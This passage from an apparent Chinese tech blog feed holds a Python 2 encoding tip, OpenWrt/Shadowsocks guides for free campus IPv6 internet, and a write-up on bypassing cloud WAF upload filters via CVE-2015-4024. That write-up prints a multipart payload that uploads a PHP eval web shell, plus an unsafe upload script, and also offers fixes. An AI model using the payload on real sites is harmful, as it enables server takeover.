<p>但是如果字符中出现非ascii字符，那么依然不能解决问题，会产生不可预知的乱码，这样可以参考 2</p>
<h2 id="2-以utf8的编码格式进行解码转为unicode编码做插入"><a href="#2-以utf8的编码格式进行解码转为unicode编码做插入" class="headerlink" title="2. 以utf8的编码格式进行解码转为unicode编码做插入"></a>2. 以utf8的编码格式进行解码转为unicode编码做插入</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">cursor.execute(<span class="string">'''</span></div><div class="line">    INSERT INTO JAVBUS_DATA (姓名, 年龄)</div><div class="line">    VALUES (?, ?)</div><div class="line">    ''', (<span class="string">'张三'</span>.decode(<span class="string">'utf-8'</span>), <span class="string">'22岁'</span>.decode(<span class="string">'utf-8'</span>)))</div></pre></td></tr></table></figure>
<p>但是如果数据太长，这样一个一个敲挺麻烦的，下面是一个使用map函数简化的小例子</p>
<a id="more"></a>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#-*-coding:utf-8-*-</span></div><div class="line"><span class="keyword">import</span> sqlite3</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_utf8</span><span class="params">(aStr)</span>:</span></div><div class="line">    <span class="keyword">return</span> aStr.decode(<span class="string">'utf-8'</span>)</div><div class="line"></div><div class="line">conn = sqlite3.connect(<span class="string">"something.db"</span>)</div><div class="line">cursor = conn.cursor()</div><div class="line"></div><div class="line">cursor.execute(<span class="string">'''</span></div><div class="line">    CREATE TABLE IF NOT EXISTS JAVBUS_DATA(</div><div class="line">        id       INT PRIMARY KEY,</div><div class="line">        姓名     TEXT,</div><div class="line">        年龄     TEXT);''')</div><div class="line"><span class="keyword">print</span> <span class="string">"Table created successfully"</span></div><div class="line">cursor.execute(<span class="string">'''</span></div><div class="line">    INSERT INTO JAVBUS_DATA (姓名, 年龄)</div><div class="line">    VALUES (?, ?)</div><div class="line">    ''', map(decode_utf8, (<span class="string">'张三'</span>, <span class="string">'22岁'</span>)))</div><div class="line"></div><div class="line">cursor.close()</div><div class="line">conn.commit()</div><div class="line">conn.close()</div></pre></td></tr></table></figure>
<h1 id="其他注意："><a href="#其他注意：" class="headerlink" title="其他注意："></a>其他注意：</h1><p>有时用第二种方法会出现UnicodeDecodeError<br>加入#-<em>-coding:utf-8-</em>-<br>还是不行请sys指定编码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> sys  </div><div class="line">reload(sys)  </div><div class="line">sys.setdefaultencoding(<span class="string">'utf8'</span>)</div></pre></td></tr></table></figure></p>
<p><strong>这个问题在python3应该不会出现，python2编码问题，仅作记录</strong></p>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[WAF攻防研究之四个层次Bypass WAF]]></title>
      <url>http://akkuman.coding.me/2016/09/25/WAF%E6%94%BB%E9%98%B2%E7%A0%94%E7%A9%B6%E4%B9%8B%E5%9B%9B%E4%B8%AA%E5%B1%82%E6%AC%A1Bypass-WAF.html</url>
      <content type="html"><![CDATA[<h1 id="绝对值得一看的技术文章"><a href="#绝对值得一看的技术文章" class="headerlink" title="绝对值得一看的技术文章"></a>绝对值得一看的技术文章</h1><p><a href="http://7xusrl.com1.z0.glb.clouddn.com/WAF%E6%94%BB%E9%98%B2%E7%A0%94%E7%A9%B6%E4%B9%8B%E5%9B%9B%E4%B8%AA%E5%B1%82%E6%AC%A1Bypass%20WAF.pdf" target="_blank" rel="external">pdf下载链接</a></p>
<p><em>[via@<a href="http://weibo.com/ttarticle/p/show?id=2309404007261092631700" target="_blank" rel="external">破-见</a> ]</em></p>
]]></content>
      
        <categories>
            
            <category> Hacker </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Hacker </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PHP DOS漏洞的新利用：CVE-2015-4024 Reviewed]]></title>
      <url>http://akkuman.coding.me/2016/09/24/PHP-DOS%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%96%B0%E5%88%A9%E7%94%A8%EF%BC%9ACVE-2015-4024-Reviewed.html</url>
      <content type="html"><![CDATA[<h1 id="1-背景介绍"><a href="#1-背景介绍" class="headerlink" title="1.     背景介绍"></a>1.     背景介绍</h1><p>今天我们想从2015.04.03的一个PHP远程dos漏洞（CVE-2015-4024）说起。技术细节见如下链接，<a href="https://bugs.php.net/bug.php?id=69364" target="_blank" rel="external">https://bugs.php.net/bug.php?id=69364</a>。因为php解析body part的header时进行字符串拼接，而拼接过程重复拷贝字符导致DOS。事实上该漏洞还有其他非dos的利用价值，其中之一，就是绕过当前各种云WAF的文件上传防御策略。</p>
<p>目前国内外流行的云WAF厂商有如百度云加速，360网站卫士，加速乐，云盾等。因为PHP远程dos漏洞及PHP官方修复方案的特点，我们成功利用该漏洞绕过了当前主流WAF的文件上传防御，例如百度云加速、360网站卫士、知道创于加速乐、安全狗。</p>
<p>接下来，我们以PHP为例，详细解析我们的绕过方法。</p>
<h1 id="2-绕过WAF的原理"><a href="#2-绕过WAF的原理" class="headerlink" title="2.     绕过WAF的原理"></a>2.     绕过WAF的原理</h1><p>根据PHP DOS漏洞原理，在multipart_buffer_headers函数解析header对应value时，value值存在n行。每行的字符串以空白符开头或不存字符’:’，都触发以下合并value的代码块。那么解析header的value就要执行(n-1)次合并value的代码块，从而导致DOS。</p>
<a id="more"></a>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">prev_len= strlen(prev_entry.value);</div><div class="line"></div><div class="line">cur_len= strlen(line);</div><div class="line"></div><div class="line">entry.value= emalloc(prev_len + cur_len + <span class="number">1</span>); <span class="comment">//1次分片内存</span></div><div class="line"></div><div class="line">memcpy(entry.value,prev_entry.value, prev_len); <span class="comment">//1次拷贝</span></div><div class="line"></div><div class="line">memcpy(entry.value+ prev_len, line, cur_len);   <span class="comment">//1次拷贝</span></div><div class="line"></div><div class="line">entry.value[cur_len+ prev_len] = <span class="string">'\0'</span>;</div><div class="line"></div><div class="line">entry.key= estrdup(prev_entry.key);</div><div class="line"></div><div class="line">zend_llist_remove_tail(header);<span class="comment">//1次内存释放</span></div></pre></td></tr></table></figure>
<p>而PHP官方修复方案，在进行合并时，避免重复拷贝，从而避免DOS。绕过WAF的关键在于，PHP multipart_buffer_headers函数解析header对应value时，value值存在多行。每行的字符串以空白符开头或不存字符’:’，将进行合并。而WAF在解析文件上传的文件名时，没有考虑协议兼容，不进行多行合并，就可以被绕过。</p>
<p>根据原理构造绕过WAF文件上传防御的payload，WAF解析到的文件名为”test3.jpg”，而PHP解析到的文件名是”test3.jpg\nf/shell.php”，因为”/”是目录分隔符，上传的文件名变为shell.php。以下是绕过paylaod、测试脚本、paylaod进行文件上传的效果图。</p>
<h2 id="WAF绕过payload"><a href="#WAF绕过payload" class="headerlink" title="WAF绕过payload:"></a>WAF绕过payload:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">------WebKitFormBoundaryx7V4AhipWn8ig52y</div><div class="line"></div><div class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test3.jpg\nsf/shell.php</div><div class="line"></div><div class="line">Content-Type: application/octet-stream</div><div class="line"></div><div class="line">&lt;?php eval($_GET[&apos;c&apos;])?&gt;</div><div class="line"></div><div class="line">------WebKitFormBoundaryx7V4AhipWn8ig52y</div></pre></td></tr></table></figure>
<h2 id="文件上传功能测试脚本"><a href="#文件上传功能测试脚本" class="headerlink" title="文件上传功能测试脚本:"></a>文件上传功能测试脚本:</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">         $name = $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> $name;</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> <span class="string">"\n"</span>;</div><div class="line"></div><div class="line">        move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>] , <span class="string">'/usr/local/nginx/html/upload/'</span>.$_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]);</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> <span class="string">"upload success! "</span>.$_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> <span class="string">"\n"</span>;</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> strlen($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>Payload能够正常上传</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6apwul8mrj30r50fptbm.jpg" alt="1"></p>
<h1 id="3-绕过WAF实战"><a href="#3-绕过WAF实战" class="headerlink" title="3.     绕过WAF实战"></a>3.     绕过WAF实战</h1><p>笔者通过搭建自己的测试站，接入360网站卫士和加速乐，验证绕过WAF文件上传防御的方法。</p>
<h2 id="3-1-绕过360网站卫士"><a href="#3-1-绕过360网站卫士" class="headerlink" title="3.1 绕过360网站卫士"></a>3.1 绕过360网站卫士</h2><h3 id="步骤1，验证网站已被360网站卫士防御，拦截了直接上传PHP文件的请求。"><a href="#步骤1，验证网站已被360网站卫士防御，拦截了直接上传PHP文件的请求。" class="headerlink" title="步骤1，验证网站已被360网站卫士防御，拦截了直接上传PHP文件的请求。"></a>步骤1，验证网站已被360网站卫士防御，拦截了直接上传PHP文件的请求。</h3><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6apy2esg5j311v0ifdjx.jpg" alt="2"></p>
<h3 id="步骤2：成功绕过360网站卫士，上传shell成功，文件是apo-php。在该请求中，有没有Content-Type不影响绕过。"><a href="#步骤2：成功绕过360网站卫士，上传shell成功，文件是apo-php。在该请求中，有没有Content-Type不影响绕过。" class="headerlink" title="步骤2：成功绕过360网站卫士，上传shell成功，文件是apo.php。在该请求中，有没有Content-Type不影响绕过。"></a>步骤2：成功绕过360网站卫士，上传shell成功，文件是apo.php。在该请求中，有没有Content-Type不影响绕过。</h3><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6apztziwvj30vm0g9af6.jpg" alt="3"></p>
<h2 id="3-2-绕过知道创宇加速乐"><a href="#3-2-绕过知道创宇加速乐" class="headerlink" title="3.2 绕过知道创宇加速乐"></a>3.2 绕过知道创宇加速乐</h2><h3 id="步骤一：验证网站被加速乐保护，拦截了直接上传PHP文件的请求。"><a href="#步骤一：验证网站被加速乐保护，拦截了直接上传PHP文件的请求。" class="headerlink" title="步骤一：验证网站被加速乐保护，拦截了直接上传PHP文件的请求。"></a>步骤一：验证网站被加速乐保护，拦截了直接上传PHP文件的请求。</h3><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6aq0sw1luj30wb0f9wjf.jpg" alt="4"></p>
<h3 id="步骤二：成功绕过加速乐，上传shell，文件是syt-php。"><a href="#步骤二：成功绕过加速乐，上传shell，文件是syt-php。" class="headerlink" title="步骤二：成功绕过加速乐，上传shell，文件是syt.php。"></a>步骤二：成功绕过加速乐，上传shell，文件是syt.php。</h3><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6aq1mvbrqj30vr0elwh2.jpg" alt="5"></p>
<h2 id="3-3-绕过百度云加速"><a href="#3-3-绕过百度云加速" class="headerlink" title="3.3. 绕过百度云加速"></a>3.3. 绕过百度云加速</h2><p>百度云加速与CloudFlare，从百度匀加速拦截页面可以看出使用的是CloudFlare. 但是估计有本地化，百度云加速应该是百度和CloudFlare共同产物吧。测试百度没有搭建自己的测试环境，找了个接入了百度云加速的站进行测试。</p>
<h3 id="步骤一：验证网站被百度云加速保护，拦截了直接上传PHP文件的请求。"><a href="#步骤一：验证网站被百度云加速保护，拦截了直接上传PHP文件的请求。" class="headerlink" title="步骤一：验证网站被百度云加速保护，拦截了直接上传PHP文件的请求。"></a>步骤一：验证网站被百度云加速保护，拦截了直接上传PHP文件的请求。</h3><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6aq30m0wjj31050etdko.jpg" alt="6"></p>
<h3 id="步骤二：成功绕过云加速"><a href="#步骤二：成功绕过云加速" class="headerlink" title="步骤二：成功绕过云加速"></a>步骤二：成功绕过云加速</h3><p>同上</p>
<h1 id="4-扩展—更多的工作"><a href="#4-扩展—更多的工作" class="headerlink" title="4.     扩展—更多的工作"></a>4.     扩展—更多的工作</h1><h2 id="4-1-分析filename其他字符的绕过"><a href="#4-1-分析filename其他字符的绕过" class="headerlink" title="4.1 分析filename其他字符的绕过"></a>4.1 分析filename其他字符的绕过</h2><p>同理，我们发现除了双引号外，使用单引号也能绕过WAF的防御，并实现文件上传。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">------WebKitFormBoundaryx7V4AhipWn8ig52y</div><div class="line"></div><div class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&apos;test3.jpg\nsf/shell.php</div><div class="line"></div><div class="line">Content-Type: application/octet-stream</div><div class="line"></div><div class="line">&lt;?php eval($_GET[&apos;c&apos;])?&gt;</div><div class="line"></div><div class="line">------WebKitFormBoundaryx7V4AhipWn8ig52y</div></pre></td></tr></table></figure>
<h2 id="4-2-分析其他应用脚本语言"><a href="#4-2-分析其他应用脚本语言" class="headerlink" title="4.2 分析其他应用脚本语言"></a>4.2 分析其他应用脚本语言</h2><p>我们也发现jsp解析也有自己的特点，同时可被用于绕过WAF。暂时未测试asp,aspx,python等常用的WEB应用脚本语言。</p>
<h1 id="5-修复方案"><a href="#5-修复方案" class="headerlink" title="5.     修复方案"></a>5.     修复方案</h1><h2 id="5-1-修复方案一"><a href="#5-1-修复方案一" class="headerlink" title="5.1 修复方案一"></a>5.1 修复方案一</h2><p>解析文件上传请求时，如果发现请求不符合协议规范，则拒绝请求。可能会产生误拦截，需要评估误拦截的影响范围。</p>
<h2 id="5-2-修复方案二"><a href="#5-2-修复方案二" class="headerlink" title="5.2 修复方案二"></a>5.2 修复方案二</h2><p>兼容php的文件解析方式，解析文件名时，以单引号或双引号开头，并且对应的单引号双引号闭合。</p>
<h1 id="6-总结"><a href="#6-总结" class="headerlink" title="6.     总结"></a>6.     总结</h1><p>本文通过Review PHP远程dos漏洞(CVE-2015-4024)，并利用该特性绕过现有WAF的文件上传防御，成功上传shell。 更重要的价值，提供给我们一个绕过WAF的新思路，一种研究新方向：利用后端应用脚本与WAF行为的差异绕过WAF的防御。总的来说，一款优秀的WAF应该能够处理兼容WEB应用容器、标准协议、web服务器这间的差异。</p>
]]></content>
      
        <categories>
            
            <category> Hacker </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Hacker </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[基于Openwrt+Shadowsocks+ipv6实现校园网免流量无限时长上网]]></title>
      <url>http://akkuman.coding.me/2016/09/24/%E5%9F%BA%E4%BA%8EOpenwrt-Shadowsocks-ipv6%E5%AE%9E%E7%8E%B0%E6%A0%A1%E5%9B%AD%E7%BD%91%E5%85%8D%E6%B5%81%E9%87%8F%E6%97%A0%E9%99%90%E6%97%B6%E9%95%BF%E4%B8%8A%E7%BD%91.html</url>
      <content type="html"><![CDATA[<blockquote>
<p>转载自<a href="http://www.jianshu.com/p/4d44172f1a5b" target="_blank" rel="external">Dyhube</a></p>
</blockquote>
<h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><p>笔者利用笔记本电脑实现ipv6免费上网已经有一段时间了，原理是通过ipv6访问ipv4资源，在学校网络不限流量、不限时长、20兆带宽（我们学校ipv6限速上下对等20兆，没办法！）,电脑开热点全寝室共用，那真是爽翻天 !</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/ipv6.png" alt="ipv6"></p>
<a id="more"></a>
<p>但是每天回到寝室总是打开电脑开热点还真是蛋疼的事情。再说电脑也不能总是开着吧。这时我就想能不能找个路由器，一天二十四小时开机，电脑、手机、平板随时都可以连。这个想法大概出现在半年前，由于手里没有路由器，就一直没弄，但是网上是有各种成功的案例的。</p>
<p>前段时间手里终于进了台K1，由于之前已经查了相当多的教程，所以就顺风顺水，很快就成功了。下面我就主要讲一下openwrt客户端的配置问题。</p>
<h1 id="意义"><a href="#意义" class="headerlink" title="意义"></a>意义</h1><p>在大部分高校，ipv4一般是计流量或计时收费的，（笔者学校就是计时收费的，50元200小时网通十兆带宽）而且，由于校园的特殊性，相应的价格也比市面上宽带服务商要高。万幸的是，这些高校一般具有ipv6网络环境，并且由于国家的大力支持，普及范围广，而且不计算流量，聪明的人早就想能不能通过利用ipv6已达到免流量及无限时长上网？答案是可行的，鉴于目前公网的环境普遍是ipv4，我们可以找一台同时具有ipv4和ipv6地址的服务器，我们在校内通过ipv6访问服务器，然后服务器处理我们的访问请求以<code>ipv4/ipv6双栈</code>的方式代替我们访问互联网，再将数据通过ipv6反馈给我们，从而到达免流上网的目的。并且，考虑到大部分高校ipv6没有限制速度，理论上可以达到服务器出口的带宽，当然，具体取决于你们学校的ipv6出口带宽。</p>
<h1 id="为什么用Shadowsocks？"><a href="#为什么用Shadowsocks？" class="headerlink" title="为什么用Shadowsocks？"></a>为什么用Shadowsocks？</h1><p>配置简单，真的简单！以前看到过信息学院的学长写的一篇blog,原理是<code>ipv6 to ipv4</code> 从而ipv6 to ipv4网络,其实原理是一样的，只是他用了<code>openvpn</code>这个软件，但是感觉实现起来好难。像这样的开源支持ipv6协议的软件还是有很多的，这里就不再陈述。</p>
<p>回到原题为什么用Shadowsocks，配置简单。vps服务提供商<a href="https://bandwagonhost.com/" target="_blank" rel="external">搬瓦工</a>现在为了迎合国人的需求现在已经预配了Shadowsocks,只需要点击以下安装就ok了。</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/877518-ab3dea8d36104b08.png" alt="1"></p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/877518-ab3dea8d36104b08.png" alt="2"></p>
<h1 id="适用对象"><a href="#适用对象" class="headerlink" title="适用对象"></a>适用对象</h1><p>具有<code>ipv6地址</code>、<code>ipv4流量</code>（计时）收费贵爱折腾的大学生。不推荐打国服游戏，延迟你懂的，但对延迟没要求的游戏还是可以玩的，美服、亚服、台服随你玩。</p>
<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><h2 id="openwrt固件路由器"><a href="#openwrt固件路由器" class="headerlink" title="openwrt固件路由器"></a>openwrt固件路由器</h2><p>路由器的刷机请自行Google,教程一大堆，刷机时笔者也遇到过很多问题，坚持！如果你的也是K1路由器，也要刷机，不妨看这个<a href="http://akkuman.coding.me/2016/09/22/%E7%BB%99%E6%96%90%E8%AE%AFK1%E5%88%B7%E6%9C%BA%E5%B9%B6%E6%8B%A8%E5%8F%B7e%E4%BF%A1-%E6%B9%96%E5%8C%97%E5%9C%B0%E5%8C%BA%E6%B5%8B%E8%AF%95%E6%97%A0%E9%97%AE%E9%A2%98/">教程</a>。刷机的重点是刷<code>Shadowsocks插件</code>，我的K1直接刷的来自恩山网友的固件，固件里已经附带了Shadowsocks。<a href="http://pan.baidu.com/s/1dFJO4hF" target="_blank" rel="external">openwrt</a>固件自取。openwrt控制面板上图。</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/877518-ed11845c67728119.png" alt="3"></p>
<h2 id="Shadowsocks-ipv6节点信息"><a href="#Shadowsocks-ipv6节点信息" class="headerlink" title="Shadowsocks+ipv6节点信息"></a>Shadowsocks+ipv6节点信息</h2><p>因为笔者手里有台美国的vps，并且配置了Shadowsocks，所以现在拿来就直接用，老实说搭建的Shadowsocks平常很少用，之前觉得租这个vps很是浪费。但是自从寝室里有了这台全天候开机的路由器，值了！在这里我要强调一下，Shadowsocks的节点我们需要ipv6地址的，不然还是没法走校内的ipv6通道。</p>
<h1 id="前方高能预警"><a href="#前方高能预警" class="headerlink" title="前方高能预警"></a>前方高能预警</h1><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p>首先openwrt固件路由器登陆<code>192.168.1.1</code>，初始登录默认密码是：<code>admin</code>。登进去之后最好先不要对任何东西改动，按照正常路由器的配置对路由器进行拨号上网。然后选择<code>Shadowsocks插件</code>，选择<code>启动</code>。（为什么这样做呢？笔者尝试了几下，不拨号上网的话，<code>Shadowsocks</code>和<code>DNS</code>配置好了以后无法上网，最后总结，先拨号上网、再配置<code>Shadowsocks</code>和<code>DNS</code>信息）</p>
<p>步骤：点击 <code>openwrt服务</code>&gt;<code>Shadowsocks</code>，出现以下界面。</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/877518-8304c61781a62c95.png" alt="4"></p>
<h2 id="Shadowsocks的配置"><a href="#Shadowsocks的配置" class="headerlink" title="Shadowsocks的配置"></a>Shadowsocks的配置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">服务器ip：  </div><div class="line">密码：  </div><div class="line">服务器端口：  </div><div class="line">加密方式：</div></pre></td></tr></table></figure>
<p>对Shadowsocks配置好了以后，点击下面的透明代理，选择<code>启动</code>。</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/877518-b2304b09473a3a76.png" alt="5"></p>
<p>对Shadowsocks配置好以后，我们的任务还没有结束，最重要的就是配置<code>DNS信息</code>。这里如果不配置DNS，IP地址选择ipv4的，Shadowsocks是国外的，那么通过这种方式使用Shadowsocks就是通过路由器来翻fq，在这里我就不多说了。</p>
<h2 id="DNS的配置"><a href="#DNS的配置" class="headerlink" title="DNS的配置"></a>DNS的配置</h2><p>DNS设置有两种方案，一种是利用<code>ChinaDNS</code>，还有一种直接在<code>DHCP/DNS</code>设置页面（<code>网络&gt;DHCP/DNS</code>）进行填写。</p>
<p>由于本次折腾的特殊性，路由器工作在<code>纯ipv6环境</code>下，也就是说路由器没有ipv4的网络，但常用的DNS服务器大多是以ipv4地址方式提供的，如果使用ipv4的DNS服务器就会导致无法解析。此处用了<code>[2001:470:0:c0::2]</code>，但是很不幸，该DNS被污染了，无法解析如google，youtube一类网址，但是对国内的网站的解析很好。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">2001:470:0:c0::2</div></pre></td></tr></table></figure>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/877518-a819f528346ea980.png" alt="6"></p>
<p>其他的DNS最好选择Google的，相对的来说，网站解析最全面，而且还可以fq,只是一部分了，选择Google的公共DNS有一个缺点，就是像移动端的微信或者qq了，朋友圈的信息或公众号加载不出来，这是很蛋疼的事情。个人还是推荐上面的那条DNS,速度快、国内网站全面，几乎全覆盖。</p>
<p>下面是一些从网上找来的公共DNS，可以试验一下，说不定有什么以外的收获呢。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">ordns.he.net  2001:470:20::2     74.82.42.42</div><div class="line"></div><div class="line">tserv1.fmt2.he.net  2001:470:0:45::2   72.52.104.74</div><div class="line"></div><div class="line">tserv1.dal1.he.net  2001:470:0:78::2   216.218.224.42</div><div class="line"></div><div class="line">tserv1.ams1.he.net  2001:470:0:7d::2   216.66.84.46</div><div class="line"></div><div class="line">tserv1.mia1.he.net  2001:470:0:8c::2   209.51.161.58</div><div class="line"></div><div class="line">tserv1.tor1.he.net  2001:470:0:c0::2   216.66.38.58</div><div class="line"></div><div class="line">ns.ipv6.uni-leipzig.de  2001:638:902:1::10   139.18.25.34</div></pre></td></tr></table></figure>
<h2 id="Google-Public-DNS"><a href="#Google-Public-DNS" class="headerlink" title="Google Public DNS"></a>Google Public DNS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">google-public-dns-a.google.com  2001:4860:4860::8888   8.8.8.8</div><div class="line"></div><div class="line">google-public-dns-b.google.com  2001:4860:4860::8844   8.8.4.4</div></pre></td></tr></table></figure>
<p>码字不容易，在这里非常感谢<a href="http://www.jianshu.com/p/6559d6e4e7ab" target="_blank" rel="external">_Echo</a>和<a href="https://www.zhangzhe.info/2016/03/openwrt-shadowsocks-ipv6/" target="_blank" rel="external">张哲</a>两人的post.</p>
<blockquote>
<p>转载自<a href="http://www.jianshu.com/p/4d44172f1a5b" target="_blank" rel="external">Dyhube</a></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> 生活 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> life </tag>
            
            <tag> Hacker </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[OpenWRT路由器使用ipv6拨号上网教程]]></title>
      <url>http://akkuman.coding.me/2016/09/22/Openwrt%E8%B7%AF%E7%94%B1%E5%99%A8%E4%BD%BF%E7%94%A8ipv6%E6%8B%A8%E5%8F%B7%E4%B8%8A%E7%BD%91%E6%95%99%E7%A8%8B.html</url>
      <content type="html"><![CDATA[<blockquote>
<p>文章来源于群友，如有侵权，请联系我(aha971030@gmail.com)删除</p>
</blockquote>
<h1 id="原理介绍分析："><a href="#原理介绍分析：" class="headerlink" title="原理介绍分析："></a>原理介绍分析：</h1><p>湖北E信地区可以使用ipv6拨号，好处是网络是上下对等不限速网络，也就是说，你的端口上限是多少，网上就可以达到多少，我测试很多次，一般在100M左右，但是遗憾的是，该拨号方式只能使用32位系统，且由于E信软件的兼容性问题，很容易导致蓝屏死机。经过大神的抓包分析，该拨号方式是使用ipv6的隧道协议传递ipv4信号。而幸运的是，现在的openwrt支持该协议。也就是说可以使用基于openwrt的路由器采用ipv6拨号。</p>
<h1 id="操作步骤："><a href="#操作步骤：" class="headerlink" title="操作步骤："></a>操作步骤：</h1><p>首先要明确是，该拨号方式也是需要进行账号换算的，首先启动路由器，并插上网线，在电脑上下载winscp这款软件，然后我们查询一下我们的ip地址，在电脑的dos界面输入ipconfig，找到以太网配置器</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/network111.png" alt="network111"></p>
<a id="more"></a>
<p>默认网关就是路由器的管理ip。</p>
<p>然后我们启动软件，按照图片设置填入数据</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/winscp111.png" alt="winscp111"></p>
<p>然后我们就进入了路由器的文件系统</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/op-config.png" alt="op-config"></p>
<p>接着，我们要做的是，进入路由器设置里面设置相关端口参数</p>
<p>在电脑的浏览器里输入管理ip地址</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/sk1530.png" alt="sk1530"></p>
<p>进入端口设置界面</p>
<p>首先设置wan口参数</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/op-01.png" alt="op-01"></p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/op-02.png" alt="op-02"></p>
<p>切换协议为PPPOE，并随便输入账号密码（具体的拨号的账号密码在后面我们会加以更改）并在高级设置里勾选以下参数</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/op-03.png" alt="op-03"></p>
<p>然后保存并应用</p>
<p>然后我们设置lan口参数</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/op-04.png" alt="op-04"></p>
<p>按照该图设置</p>
<p>最后，我们回到接口总界面，自己创建一个端口</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/op-05.png" alt="op-05"></p>
<p>名字无所谓，但协议要选择rfc6333</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/op-06.png" alt="op-06"></p>
<p>提交以后填写ipv6的地址，经过大神的尝试，下面给的这个地址是比较稳定的，建议使用</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/op-07.png" alt="op-07"></p>
